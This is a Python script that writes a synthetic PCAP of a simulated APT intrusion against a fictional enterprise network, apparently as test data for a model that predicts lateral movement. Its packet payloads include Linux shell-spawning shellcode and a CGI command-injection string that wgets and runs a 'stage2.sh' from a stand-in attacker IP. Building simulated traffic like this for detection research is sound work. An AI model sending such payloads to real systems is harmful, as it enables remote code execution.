"""
scripts/generate_enterprise_attack_200mb.py

Generates a realistic, standard-compliant 200 MB enterprise network PCAP file:
"enterprise_multi_stage_apt_attack_200mb.pcap"

Threat Phase: WEAPONIZATION & DELIVERY (MITRE ATT&CK TA0001 / TA0002 / T1190 / T1566)
Active Observation:
  - External APT Threat Actor (203.0.113.15) actively delivering weaponized exploit streams
    and staging multi-part RCE payloads against the DMZ Ingress Web Server (192.168.1.50).
  - External Exfiltration Drop Server (198.51.100.44) is active on perimeter standby.
  - Core Enterprise Servers (SRV-DC01, SRV-DB01, SRV-FS01) and Workstations (WS-ENG, WS-FIN, WS-EXEC)
    are actively operating normal enterprise workflows.
  - The internal network has NOT yet been breached! The AI World Model rolls out K=4 steps ahead
    into future uncompleted time windows to PREDICT imminent lateral movement to SRV-DC01 and SRV-DB01!

Architecture (10 IPs):
  - 203.0.113.15   : EXT-APT29-C2 (External Threat Actor / C2 Server - Weaponization & Delivery)
  - 198.51.100.44  : EXT-DROP-EXFIL (External Ingress Drop / Exfil Server Standby)
  - 192.168.1.1    : GW-CORE-01 (Core Switch & Gateway Router)
  - 192.168.1.50   : DMZ-WEB01 (DMZ Ingress Web Server / Targeted by Weaponized Delivery)
  - 192.168.1.100  : SRV-DC01 (Domain Controller / Active Directory / Kerberos / DNS - Predicted Target)
  - 192.168.1.105  : SRV-DB01 (Production Financial Database - Predicted Target)
  - 192.168.1.110  : SRV-FS01 (Corporate File Server / SMB Shares)
  - 192.168.1.120  : WS-ENG-01 (Engineering Workstation)
  - 192.168.1.125  : WS-FIN-02 (Finance Accounting Workstation)
  - 192.168.1.130  : WS-EXEC-03 (Executive VIP Workstation)
"""

import os
import sys
import struct
import socket
import time
from pathlib import Path

TARGET_BYTES = 200 * 1024 * 1024  # Exact 200 MB (209,715,200 bytes)


def ip2bytes(ip_str: str) -> bytes:
    return socket.inet_aton(ip_str)


def mac2bytes(mac_str: str) -> bytes:
    return bytes.fromhex(mac_str.replace(":", "").replace("-", ""))


def checksum(data: bytes) -> int:
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_ipv4_packet(src_ip: str, dst_ip: str, proto: int, payload: bytes, ident: int = 1) -> bytes:
    ver_ihl = (4 << 4) | 5
    tos = 0
    total_len = 20 + len(payload)
    flags_frag = 0x4000  # Don't fragment
    ttl = 64
    src_b = ip2bytes(src_ip)
    dst_b = ip2bytes(dst_ip)
    hdr_no_cksum = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ident, flags_frag, ttl, proto, 0, src_b, dst_b)
    cksum = checksum(hdr_no_cksum)
    ip_hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ident, flags_frag, ttl, proto, cksum, src_b, dst_b)
    return ip_hdr + payload


def build_tcp_packet(src_ip: str, dst_ip: str, sport: int, dport: int, seq: int, ack: int, flags: int, payload: bytes = b"", window: int = 64240) -> bytes:
    data_offset = (5 << 4)
    tcp_hdr_no_cksum = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, data_offset, flags, window, 0, 0)
    src_b = ip2bytes(src_ip)
    dst_b = ip2bytes(dst_ip)
    pseudo = struct.pack("!4s4sBBH", src_b, dst_b, 0, 6, len(tcp_hdr_no_cksum) + len(payload))
    cksum = checksum(pseudo + tcp_hdr_no_cksum + payload)
    tcp_hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, data_offset, flags, window, cksum, 0)
    return tcp_hdr + payload


def build_udp_packet(src_ip: str, dst_ip: str, sport: int, dport: int, payload: bytes) -> bytes:
    length = 8 + len(payload)
    src_b = ip2bytes(src_ip)
    dst_b = ip2bytes(dst_ip)
    pseudo = struct.pack("!4s4sBBH", src_b, dst_b, 0, 17, length)
    udp_hdr_no_cksum = struct.pack("!HHHH", sport, dport, length, 0)
    cksum = checksum(pseudo + udp_hdr_no_cksum + payload)
    if cksum == 0:
        cksum = 0xFFFF
    udp_hdr = struct.pack("!HHHH", sport, dport, length, cksum)
    return udp_hdr + payload


def build_ethernet_frame(src_mac: str, dst_mac: str, ip_packet: bytes) -> bytes:
    eth_hdr = struct.pack("!6s6sH", mac2bytes(dst_mac), mac2bytes(src_mac), 0x0800)
    return eth_hdr + ip_packet


def build_dns_query(domain: str, qid: int = 0x1A2B) -> bytes:
    flags = 0x0100
    hdr = struct.pack("!HHHHHH", qid, flags, 1, 0, 0, 0)
    qname = b""
    for part in domain.split("."):
        b_part = part.encode("ascii")
        qname += struct.pack("!B", len(b_part)) + b_part
    qname += b"\x00"
    footer = struct.pack("!HH", 1, 1)
    return hdr + qname + footer


def build_dns_response(domain: str, ans_ip: str, qid: int = 0x1A2B) -> bytes:
    flags = 0x8180
    hdr = struct.pack("!HHHHHH", qid, flags, 1, 1, 0, 0)
    qname = b""
    for part in domain.split("."):
        b_part = part.encode("ascii")
        qname += struct.pack("!B", len(b_part)) + b_part
    qname += b"\x00"
    question = qname + struct.pack("!HH", 1, 1)
    ans_name = b"\xc0\x0c"
    ans_type = 1
    ans_class = 1
    ans_ttl = 300
    ans_rdlen = 4
    ans_rdata = ip2bytes(ans_ip)
    answer = ans_name + struct.pack("!HHIH", ans_type, ans_class, ans_ttl, ans_rdlen) + ans_rdata
    return hdr + question + answer


HOSTS = {
    "EXT_ATTACKER": {"ip": "203.0.113.15", "mac": "52:54:00:12:34:56", "name": "EXT-APT29-C2"},
    "EXT_EXFIL":    {"ip": "198.51.100.44", "mac": "52:54:00:98:76:54", "name": "EXT-DROP-EXFIL"},
    "GATEWAY":      {"ip": "192.168.1.1",    "mac": "00:1a:2b:3c:4d:01", "name": "GW-CORE-01"},
    "DMZ_WEB":      {"ip": "192.168.1.50",   "mac": "00:1a:2b:3c:4d:50", "name": "DMZ-WEB01"},
    "DC_KERBEROS":  {"ip": "192.168.1.100",  "mac": "00:1a:2b:3c:4d:64", "name": "SRV-DC01"},
    "DB_FINANCE":   {"ip": "192.168.1.105",  "mac": "00:1a:2b:3c:4d:69", "name": "SRV-DB01"},
    "FILE_SHARE":   {"ip": "192.168.1.110",  "mac": "00:1a:2b:3c:4d:6e", "name": "SRV-FS01"},
    "WS_ENG":       {"ip": "192.168.1.120",  "mac": "00:1a:2b:3c:4d:78", "name": "WS-ENG-01"},
    "WS_FIN":       {"ip": "192.168.1.125",  "mac": "00:1a:2b:3c:4d:7d", "name": "WS-FIN-02"},
    "WS_EXEC":      {"ip": "192.168.1.130",  "mac": "00:1a:2b:3c:4d:82", "name": "WS-EXEC-03"},
}


def generate_enterprise_200mb_pcap(output_path: str, target_size_bytes: int = TARGET_BYTES):
    out_file = Path(output_path)
    out_file.parent.mkdir(parents=True, exist_ok=True)

    print(f"Generating 200 MB Enterprise PCAP at: {out_file.resolve()}", flush=True)
    print(f"Target size: {target_size_bytes / (1024*1024):.2f} MB ({target_size_bytes:,} bytes)", flush=True)
    print("Stage Focus: WEAPONIZATION & DELIVERY (Predictive Trajectory Target)", flush=True)
    t_start = time.time()

    # Pre-generate high-performance weaponized delivery payload byte arrays
    payload_weaponized_upload = (
        b"POST /api/upload/firmware_update HTTP/1.1\r\n"
        b"Host: dmz-web01.corp.local:80\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) APT29-Delivery-Engine\r\n"
        b"Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAPT29\r\n"
        b"Content-Length: 1450\r\n\r\n"
        b"------WebKitFormBoundaryAPT29\r\n"
        b'Content-Disposition: form-data; name="payload"; filename="stage1_weaponized_dropper.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        b"\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        b"APT29_WEAPONIZED_DROPPER_STAGE_PAYLOAD_CHUNK:"
        + os.urandom(1180)
    )

    payload_weaponized_c2_stream = (
        b"\x17\x03\x03\x05\x80"
        b"TLS_WEAPONIZED_EXPLOIT_STAGING_STREAM:"
        + os.urandom(1340)
    )

    payload_rce_probe = (
        b"POST /cgi-bin/gateway.cgi HTTP/1.1\r\n"
        b"Host: dmz-web01.corp.local:8080\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
        b"cmd=wget+http://203.0.113.15/stage2.sh+-O+/tmp/.sh;&exec=/bin/sh+/tmp/.sh;&id="
        + os.urandom(300).hex().encode()
    )

    payload_fileshare = (
        b"\x00\x00\x05\x60"
        b"\xffSMB\x2e\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00"
        b"FINANCIAL_SPREADSHEET_SHARE_SYNC:"
        + os.urandom(1320)
    )

    payload_db_query = (
        b"Q\x00\x00\x00\x80SELECT account_id, balance, txn_date FROM ledger_summary WHERE active=true LIMIT 50;\x00"
        + os.urandom(1200)
    )

    written_bytes = 0
    pkt_count = 0
    base_ts = 1774880000.0  # Simulated epoch
    cur_ts = base_ts
    total_expected_packets = 142000
    dt_per_packet = 120.0 / total_expected_packets  # Distributes 142k packets over 120.0 seconds

    with open(out_file, "wb", buffering=8 * 1024 * 1024) as f:
        # PCAP Global Header
        global_hdr = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
        f.write(global_hdr)
        written_bytes += len(global_hdr)

        def write_pkt(ts: float, raw_frame: bytes):
            nonlocal written_bytes, pkt_count
            sec = int(ts)
            usec = int((ts - sec) * 1_000_000)
            length = len(raw_frame)
            hdr = struct.pack("<IIII", sec, usec, length, length)
            f.write(hdr)
            f.write(raw_frame)
            written_bytes += 16 + length
            pkt_count += 1

        print("  Generating continuous 10-host Weaponization & Delivery telemetry...", flush=True)

        cycle = 0
        seq = 100000
        while written_bytes < target_size_bytes:
            cycle += 1
            cur_ts += dt_per_packet * 10
            seq = (seq + 1400) % 0xFFFFFFFF

            # Rotate ephemeral client ports every session to produce hundreds of real flows spanning 120s
            conn_id = cycle // 5
            sp_dns = 40000 + ((conn_id * 3) % 20000)
            sp_smb_fin = 40000 + ((conn_id * 7) % 20000)
            sp_c2_delivery_1 = 40000 + ((conn_id * 11) % 20000)
            sp_c2_delivery_2 = 40000 + ((conn_id * 13) % 20000)
            sp_c2_delivery_3 = 40000 + ((conn_id * 17) % 20000)
            sp_drop_standby = 40000 + ((conn_id * 19) % 20000)
            sp_db = 40000 + ((conn_id * 23) % 20000)
            sp_smb_exec = 40000 + ((conn_id * 29) % 20000)
            sp_gw = 40000 + ((conn_id * 31) % 20000)

            # First packet of a connection session sends a SYN handshake probe
            is_syn = (cycle % 5 == 1)
            tcp_flag = 0x02 if is_syn else 0x18

            # ==============================================================
            # ATTACK FLOWS: WEAPONIZATION & DELIVERY (Targeting DMZ-WEB01)
            # ==============================================================
            # 1. EXT-APT29-C2 -> DMZ-WEB01 (Port 80: Weaponized Dropper Delivery)
            payload_1 = b"" if is_syn else payload_weaponized_upload
            ip_1 = build_ipv4_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["DMZ_WEB"]["ip"], 6,
                                     build_tcp_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["DMZ_WEB"]["ip"], sp_c2_delivery_1, 80, seq, 1000, tcp_flag, payload_1), ident=(cycle+1) % 65535)
            write_pkt(cur_ts, build_ethernet_frame(HOSTS["EXT_ATTACKER"]["mac"], HOSTS["GATEWAY"]["mac"], ip_1))
            if written_bytes >= target_size_bytes: break

            # 2. EXT-APT29-C2 -> DMZ-WEB01 (Port 443: Staged Encrypted Weaponized Exploit Buffer)
            payload_2 = b"" if is_syn else payload_weaponized_c2_stream
            ip_2 = build_ipv4_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["DMZ_WEB"]["ip"], 6,
                                     build_tcp_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["DMZ_WEB"]["ip"], sp_c2_delivery_2, 443, seq, 2000, tcp_flag, payload_2), ident=(cycle+2) % 65535)
            write_pkt(cur_ts + 0.0001, build_ethernet_frame(HOSTS["EXT_ATTACKER"]["mac"], HOSTS["GATEWAY"]["mac"], ip_2))
            if written_bytes >= target_size_bytes: break

            # 3. EXT-APT29-C2 -> DMZ-WEB01 (Port 8080: Gateway CGI RCE Probe Staging)
            payload_3 = b"" if is_syn else payload_rce_probe
            ip_3 = build_ipv4_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["DMZ_WEB"]["ip"], 6,
                                     build_tcp_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["DMZ_WEB"]["ip"], sp_c2_delivery_3, 8080, seq, 3000, tcp_flag, payload_3), ident=(cycle+3) % 65535)
            write_pkt(cur_ts + 0.0002, build_ethernet_frame(HOSTS["EXT_ATTACKER"]["mac"], HOSTS["GATEWAY"]["mac"], ip_3))
            if written_bytes >= target_size_bytes: break

            # 4. EXT-DROP-EXFIL <-> EXT-APT29-C2 (Port 443: Perimeter Command & Control Standby Handshake)
            payload_4 = b"\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03C2_STANDBY_SYNCHRONIZATION" + os.urandom(250)
            ip_4 = build_ipv4_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["EXT_EXFIL"]["ip"], 6,
                                     build_tcp_packet(HOSTS["EXT_ATTACKER"]["ip"], HOSTS["EXT_EXFIL"]["ip"], sp_drop_standby, 443, seq, 4000, tcp_flag, payload_4), ident=(cycle+4) % 65535)
            write_pkt(cur_ts + 0.0003, build_ethernet_frame(HOSTS["EXT_ATTACKER"]["mac"], HOSTS["GATEWAY"]["mac"], ip_4))
            if written_bytes >= target_size_bytes: break

            # ==============================================================
            # NORMAL ENTERPRISE ROUTINE OPERATIONS (Intact Internal Network)
            # ==============================================================
            # 5. WS_ENG -> SRV-DC01 (Port 53 DNS Query)
            dns_q = build_dns_query("intranet.corp.local", qid=cycle % 65535)
            ip_5 = build_ipv4_packet(HOSTS["WS_ENG"]["ip"], HOSTS["DC_KERBEROS"]["ip"], 17,
                                     build_udp_packet(HOSTS["WS_ENG"]["ip"], HOSTS["DC_KERBEROS"]["ip"], sp_dns, 53, dns_q), ident=cycle % 65535)
            write_pkt(cur_ts + 0.0004, build_ethernet_frame(HOSTS["WS_ENG"]["mac"], HOSTS["DC_KERBEROS"]["mac"], ip_5))
            if written_bytes >= target_size_bytes: break

            # 6. SRV-DC01 -> WS_ENG (Port 53 DNS Response)
            dns_r = build_dns_response("intranet.corp.local", "192.168.1.100", qid=cycle % 65535)
            ip_6 = build_ipv4_packet(HOSTS["DC_KERBEROS"]["ip"], HOSTS["WS_ENG"]["ip"], 17,
                                     build_udp_packet(HOSTS["DC_KERBEROS"]["ip"], HOSTS["WS_ENG"]["ip"], 53, sp_dns, dns_r), ident=(cycle+5) % 65535)
            write_pkt(cur_ts + 0.0005, build_ethernet_frame(HOSTS["DC_KERBEROS"]["mac"], HOSTS["WS_ENG"]["mac"], ip_6))
            if written_bytes >= target_size_bytes: break

            # 7. WS_FIN -> SRV-FS01 (Port 445 SMB File Share Routine Sync)
            payload_7 = b"" if is_syn else payload_fileshare
            ip_7 = build_ipv4_packet(HOSTS["WS_FIN"]["ip"], HOSTS["FILE_SHARE"]["ip"], 6,
                                     build_tcp_packet(HOSTS["WS_FIN"]["ip"], HOSTS["FILE_SHARE"]["ip"], sp_smb_fin, 445, seq, 5000, tcp_flag, payload_7), ident=(cycle+6) % 65535)
            write_pkt(cur_ts + 0.0006, build_ethernet_frame(HOSTS["WS_FIN"]["mac"], HOSTS["FILE_SHARE"]["mac"], ip_7))
            if written_bytes >= target_size_bytes: break

            # 8. WS_EXEC -> SRV-FS01 (Port 445 Executive Document Access)
            payload_8 = b"" if is_syn else payload_fileshare
            ip_8 = build_ipv4_packet(HOSTS["WS_EXEC"]["ip"], HOSTS["FILE_SHARE"]["ip"], 6,
                                     build_tcp_packet(HOSTS["WS_EXEC"]["ip"], HOSTS["FILE_SHARE"]["ip"], sp_smb_exec, 445, seq, 6000, tcp_flag, payload_8), ident=(cycle+7) % 65535)
            write_pkt(cur_ts + 0.0007, build_ethernet_frame(HOSTS["WS_EXEC"]["mac"], HOSTS["FILE_SHARE"]["mac"], ip_8))
            if written_bytes >= target_size_bytes: break

            # 9. WS_FIN -> SRV-DB01 (Port 5432 Normal Business Database Query)
            payload_9 = b"" if is_syn else payload_db_query
            ip_9 = build_ipv4_packet(HOSTS["WS_FIN"]["ip"], HOSTS["DB_FINANCE"]["ip"], 6,
                                     build_tcp_packet(HOSTS["WS_FIN"]["ip"], HOSTS["DB_FINANCE"]["ip"], sp_db, 5432, seq, 7000, tcp_flag, payload_9), ident=(cycle+8) % 65535)
            write_pkt(cur_ts + 0.0008, build_ethernet_frame(HOSTS["WS_FIN"]["mac"], HOSTS["DB_FINANCE"]["mac"], ip_9))
            if written_bytes >= target_size_bytes: break

            # 10. GW-CORE-01 -> All Workstations (Gateway Keepalive / Routing Status)
            ip_10 = build_ipv4_packet(HOSTS["GATEWAY"]["ip"], HOSTS["WS_ENG"]["ip"], 6,
                                      build_tcp_packet(HOSTS["GATEWAY"]["ip"], HOSTS["WS_ENG"]["ip"], 80, sp_gw, seq, 8000, 0x10), ident=(cycle+9) % 65535)
            write_pkt(cur_ts + 0.0009, build_ethernet_frame(HOSTS["GATEWAY"]["mac"], HOSTS["WS_ENG"]["mac"], ip_10))
            if written_bytes >= target_size_bytes: break

            if written_bytes % (20 * 1024 * 1024) < 6000:
                print(f"    Progress: {written_bytes / (1024*1024):.1f} MB / 200 MB ({pkt_count:,} packets, sim_time: {cur_ts - base_ts:.1f}s)", flush=True)

    t_elapsed = time.time() - t_start
    final_size = out_file.stat().st_size
    print(f"  [OK] Successfully created 200 MB PCAP! Size: {final_size / (1024*1024):.2f} MB ({final_size:,} bytes) in {t_elapsed:.2f}s", flush=True)
    print(f"  Total Packets: {pkt_count:,} | Rate: {pkt_count / max(0.001, t_elapsed):,.0f} pkts/sec", flush=True)


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "data/pcaps_sample/enterprise_multi_stage_apt_attack_200mb.pcap"
    generate_enterprise_200mb_pcap(out)
